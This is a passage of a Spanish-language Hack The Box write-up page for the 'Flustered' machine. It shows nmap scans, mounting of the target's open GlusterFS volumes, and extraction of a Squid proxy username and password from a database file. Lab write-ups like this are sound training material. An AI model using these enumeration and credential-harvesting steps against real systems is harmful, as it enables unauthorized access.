@@ -1,0 +1,1211 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.3.9">
+    
+    
+      
+        <title>Flustered - Pentesting</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#flustered-htb" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Flustered
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Pentesting
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Introdución
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Máquinas
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Máquinas" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Máquinas
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Linux" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../academy/" class="md-nav__link">
+        Academy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bank/" class="md-nav__link">
+        Bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        Bolt
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chainsaw/" class="md-nav__link">
+        Chainsaw
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../epsilon/" class="md-nav__link">
+        Epsilon
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Flustered
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Flustered
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enum" class="md-nav__link">
+    Enum
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#squid-proxy-configuration" class="md-nav__link">
+    Squid Proxy Configuration:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-server-site-template-injection-reverse-shell" class="md-nav__link">
+    SSTI (Server Site Template Injection) =&gt; Reverse Shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-server-side-template-injection" class="md-nav__link">
+    SSTI (Server Side Template Injection)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalate-privileges" class="md-nav__link">
+    Escalate privileges
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalada-a-root" class="md-nav__link">
+    Escalada a root
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../goodgames/" class="md-nav__link">
+        Goodgames
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../laboratory/" class="md-nav__link">
+        Laboratory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nodeblog/" class="md-nav__link">
+        Nodeblog
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nunchucks/" class="md-nav__link">
+        Nunckucks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pressed/" class="md-nav__link">
+        Pressed
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../unbalanced/" class="md-nav__link">
+        Unbalanced
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../validation/" class="md-nav__link">
+        Validation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zipper/" class="md-nav__link">
+        Zipper
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Windows
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Windows" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Windows
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/arkham/" class="md-nav__link">
+        Arkham
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/return/" class="md-nav__link">
+        Return
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Recursos
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Recursos" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Recursos
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/docker/" class="md-nav__link">
+        Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/exploits/" class="md-nav__link">
+        Exploits
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/inyecciones/" class="md-nav__link">
+        Inyecciones
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/shells/" class="md-nav__link">
+        Shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/tools/" class="md-nav__link">
+        Tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/win-commands/" class="md-nav__link">
+        Windows Commands
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="flustered-htb">Flustered HTB</h1>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>
+<p>Se comprueba que la máquina está activa:</p>
+<blockquote>
+<p><code>ping 10.10.11.131</code></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<ul>
+<li>
+<p>Se realiza un scan de los 65535 puertos TCP:</p>
+<blockquote>
+<p><code>nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.131</code></p>
+</blockquote>
+</li>
+<li>
+<p>Se realiza un scan de los puertos abiertos y se añade el dominio encontrado a hosts:</p>
+<blockquote>
+<p><code>nmap -sCV -p22,80,111,3128,24007,49152,49153 10.10.11.131 -oN openPorts</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 18:41 CEST
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Nmap scan report for steampunk-era.htb (10.10.11.131)
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Host is up (0.037s latency).
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>PORT      STATE SERVICE     VERSION
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>| ssh-hostkey: 
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>80/tcp    open  http        nginx 1.14.2
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>|_http-title: steampunk-era.htb - Coming Soon
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>|_http-server-header: nginx/1.14.2
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>111/tcp   open  rpcbind     2-4 (RPC #100000)
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>| rpcinfo: 
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>|   program version    port/proto  service
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>|   100000  2,3,4        111/tcp   rpcbind
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>|   100000  2,3,4        111/udp   rpcbind
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>|   100000  3,4          111/tcp6  rpcbind
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>|_  100000  3,4          111/udp6  rpcbind
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>3128/tcp  open  http-proxy  Squid http proxy 4.6
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>|_http-title: ERROR: The requested URL could not be retrieved
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>|_http-server-header: squid/4.6
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>24007/tcp open  rpcbind
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>49152/tcp open  ssl/unknown
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>| ssl-cert: Subject: commonName=flustered.htb
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>| Not valid before: 2021-11-25T15:27:31
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>|_Not valid after:  2089-12-13T15:27:31
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>|_ssl-date: TLS randomness does not represent time
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>49153/tcp open  rpcbind
+</code></pre></div>
+</li>
+<li>
+<p>En el puerto 24007 se encuentra el servicio gluster:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&gt; apt install glusterfs-server
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Leyendo lista de paquetes... Hecho
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Creando árbol de dependencias... Hecho
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Leyendo la información de estado... Hecho
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>glusterfs-server ya está en su versión más reciente <span class="o">(</span><span class="m">9</span>.2-1<span class="o">)</span>.
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Los paquetes indicados a continuación se instalaron de forma automática y ya no son necesarios.
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>libindicator3-7 linux-compiler-gcc-11-x86 linux-headers-5.16.0-12parrot1-common linux-kbuild-5.16
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>Utilice «apt autoremove» para eliminarlos.
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="m">0</span> actualizados, <span class="m">0</span> nuevos se instalarán, <span class="m">0</span> para eliminar y <span class="m">4</span> no actualizados.
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>&gt; apt install glusterfs-client
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>Leyendo lista de paquetes... Hecho
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>Creando árbol de dependencias... Hecho
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>Leyendo la información de estado... Hecho
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>glusterfs-client ya está en su versión más reciente <span class="o">(</span><span class="m">9</span>.2-1<span class="o">)</span>.
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>Los paquetes indicados a continuación se instalaron de forma automática y ya no son necesarios.
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>libindicator3-7 linux-compiler-gcc-11-x86 linux-headers-5.16.0-12parrot1-common linux-kbuild-5.16
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>Utilice «apt autoremove» para eliminarlos.
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="m">0</span> actualizados, <span class="m">0</span> nuevos se instalarán, <span class="m">0</span> para eliminar y <span class="m">4</span> no actualizados.
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>&gt; gluster --remote-host<span class="o">=</span><span class="m">10</span>.10.11.131 volume list
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>vol1
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>vol2
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>&gt; mount.glusterfs flustered.htb:/vol1 /home/x/Documentos/htb/flustered/puntodemontaje
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>Mount failed. Check the log file  <span class="k">for</span> more details.
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="c1"># Miramos los logs y vemos un problema de que no resuelve flustered, por lo cual lo agregamos al fichero hosts:</span>
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>&gt; cat /var/log/glusterfs/home-x-Documentos-htb-flustered-puntodemontaje.log<span class="p">|</span> grep fail 
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="o">[</span><span class="m">2022</span>-09-03 <span class="m">18</span>:24:49.784146 +0000<span class="o">]</span> E <span class="o">[</span>name.c:264:af_inet_client_get_remote_sockaddr<span class="o">]</span> <span class="m">0</span>-vol2-client-0: DNS resolution failed on host flustered
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="o">[</span><span class="m">2022</span>-09-03 <span class="m">18</span>:24:49.790468 +0000<span class="o">]</span> E <span class="o">[</span>fuse-bridge.c:5362:fuse_first_lookup<span class="o">]</span> <span class="m">0</span>-fuse: first lookup on root failed <span class="o">(</span>Transport endpoint is not connected<span class="o">)</span>
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="c1"># La siguiente vez que lo corremos para montar el vol1 da otro error de certificados, de los cuales no disponemos:</span>
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>&gt; cat /var/log/glusterfs/home-x-Documentos-htb-flustered-puntodemontaje.log<span class="p">|</span> grep ssl 
+<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="m">8</span>:     option transport.socket.ssl-enabled off
+<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="m">8</span>:     option transport.socket.ssl-enabled off
+<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="o">[</span><span class="m">2022</span>-09-03 <span class="m">18</span>:33:32.282587 +0000<span class="o">]</span> I <span class="o">[</span>socket.c:4279:ssl_setup_connection_params<span class="o">]</span> <span class="m">0</span>-vol1-client-0: SSL support <span class="k">for</span> MGMT is NOT enabled IO path is ENABLED certificate depth is <span class="m">1</span> <span class="k">for</span> peer 
+<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="o">[</span><span class="m">2022</span>-09-03 <span class="m">18</span>:33:32.283217 +0000<span class="o">]</span> E <span class="o">[</span>socket.c:4397:ssl_setup_connection_params<span class="o">]</span> <span class="m">0</span>-vol1-client-0: could not load our cert at /etc/ssl/glusterfs.pem
+<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>
+<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="c1"># Se procede a montar el vol2:</span>
+<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>&gt; mount.glusterfs flustered.htb:/vol2 /home/x/Documentos/htb/flustered/puntodemontaje
+<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>
+<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="c1"># De este modo obtenemos los credenciales de Squid Proxy:</span>
+<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>&gt; <span class="nb">pwd</span>
+<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>/home/x/Documentos/htb/flustered/puntodemontaje/squid
+<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>&gt; strings passwd.ibd
+<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>infimum
+<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>supremum
+<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>lance.friedman <span class="o">(</span>user<span class="o">)</span>
+<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>o&gt;WJ5-jD&lt;<span class="m">5</span>^m3 <span class="o">(</span>passwd<span class="o">)</span>
+<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>Lance Friedman
+</code></pre></div>
+</li>
+</ul>
+<h2 id="squid-proxy-configuration">Squid Proxy Configuration:</h2>
+<ul>
+<li>
+<p>Ya se puede configurar el Squid Proxy para revisar esa parte:</p>
+<p><img alt="" src="../images/squid_flustered.png" /></p>
